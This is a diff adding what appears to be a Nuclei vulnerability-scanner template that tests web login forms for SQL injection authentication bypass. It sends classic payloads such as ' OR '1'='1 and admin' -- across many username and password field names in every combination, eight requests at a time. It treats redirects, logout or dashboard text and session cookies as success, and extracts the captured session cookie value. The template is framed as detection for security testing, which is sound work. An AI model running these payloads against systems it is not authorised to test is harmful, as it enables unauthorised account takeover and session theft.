@@ -1,0 +1,108 @@
+id: sqli-auth-bypass
+info:
+  name: SQLi - Authentication bypass
+  author: Jun Min
+  severity: critical
+  description: Detects common login bypass techniques against web login endpoints (SQL injection payloads). Attempts username/password SQLi payloads against multiple parameter names and looks for authentication indicators.
+  
+  tags:
+    - auth-bypass
+    - sqli
+    - login
+    - authentication
+
+requests:
+  - id: login-post
+    method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      param:                       
+        - "username"
+        - "user"
+        - "email"
+        - "email_address"
+        - "login"
+        - "uid"
+        - "uname"
+
+      password_param:             
+        - "password"
+        - "pass"
+        - "pwd"
+        - "user_pass"
+        - "login_password"
+        - "passwd"
+
+      username:
+        - "admin"
+        - "administrator"
+        - "root"
+        - "test"
+        - "' OR '1'='1"
+        - "admin' -- "
+        - "admin'/*"
+
+      password:
+        - "' OR '1'='1"
+        - "' OR '1'='1' -- "
+        - "' OR 1=1 -- "
+        - ""
+
+    body: "{{param}}={{username}}&{{password_param}}={{password}}"
+    attack: clusterbomb #try every possible combination
+    threads: 8 #send how many requests at a same time
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 302
+          - 301
+
+      - type: word
+        part: body
+        words:
+          - "Dashboard"
+          - "Sign out"
+          - "sign out"
+          - "Logout"
+          - "logout"
+          - "My Account"
+        condition: or
+
+      - type: regex
+        part: header
+        regex:
+          - "(?i)set-cookie:.*(session|sessionid|PHPSESSID|php_session)"
+        condition: or
+
+
+    extractors:
+      - type: regex
+        name: status_match
+        part: header
+        regex:
+          - "(?i)^HTTP/\\d\\.\\d\\s+(301|302)"
+
+      - type: regex
+        name: cookie_match
+        part: header
+        regex:
+          - "(?i)set-cookie:.*?(PHPSESSID|session|sessionid|php_session)=([^;\\s]+)"
+
+      - type: regex
+        name: redirect_to
+        part: header
+        regex:
+          - "(?i)location:\\s*(.+)"
+
+      - type: regex
+        name: word_match
+        part: body
+        regex:
+          - "(Dashboard|Sign out|sign out|Logout|logout|My Account)"
